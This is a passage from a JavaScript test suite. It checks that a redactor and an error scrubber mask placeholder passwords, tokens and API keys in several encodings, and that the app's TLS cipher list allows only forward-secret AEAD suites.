    const { Redactor } = await import('../src/engine/runner.js');
    const r = new Redactor();
    const pw = 'S3cr3t"pa$$:word';
    r.add(pw);
    const out = JSON.stringify(
      r.apply({
        json: JSON.stringify({ password: pw }),
        urlenc: 'password=' + encodeURIComponent(pw),
        b64: Buffer.from(pw).toString('base64'),
        basic: 'Basic ' + Buffer.from('svc-user:' + pw).toString('base64'),
        headers: { 'proxy-authorization': 'Basic abc', 'x-api-key': 'k-123456' },
        body: { access_token: 'eyJhbGciOi.runtime-token.sig', refresh_token: 'rt-123456' },
      }),
    );
    for (const leak of [pw, encodeURIComponent(pw), Buffer.from(pw).toString('base64'), 'runtime-token', 'rt-123456', 'k-123456', 'Basic abc']) expect(out).not.toContain(leak);
    // a token seen once is masked wherever it shows up later
    expect(r.apply('Authorization: Bearer eyJhbGciOi.runtime-token.sig')).toBe('Authorization: Bearer ***');
  });

  it('scrubs JSON-escaped and URL-encoded secrets from error reports', async () => {
    const { scrubString } = await import('@sm/shared');
    expect(scrubString(JSON.stringify({ msg: 'pa"ss\\w0rd-XYZ' }), { secrets: ['pa"ss\\w0rd-XYZ'] })).not.toContain('w0rd');
    expect(scrubString('passwd=p%40ss%20w0rd', { secrets: ['p@ss w0rd'] })).not.toContain('w0rd');
    expect(scrubString('Error: bad body {"password":"correct horse battery staple"}')).not.toContain('battery');
    expect(scrubString('Authorization: Bearer ab!cdefghijkl')).toBe('Authorization: Bearer ***');
  });

  it('uses TLS 1.2+ with forward-secret AEAD suites only', async () => {
    const { TLS_CIPHERS } = await import('../src/app.js');
    expect(TLS_CIPHERS).not.toMatch(/(^|:)(AES|DES|RC4|RSA-AES)|CBC|-SHA(:|$)/);
    expect(TLS_CIPHERS.split(':').every((c) => c.startsWith('ECDHE-') && /GCM|CHACHA20/.test(c))).toBe(true);
  });
});
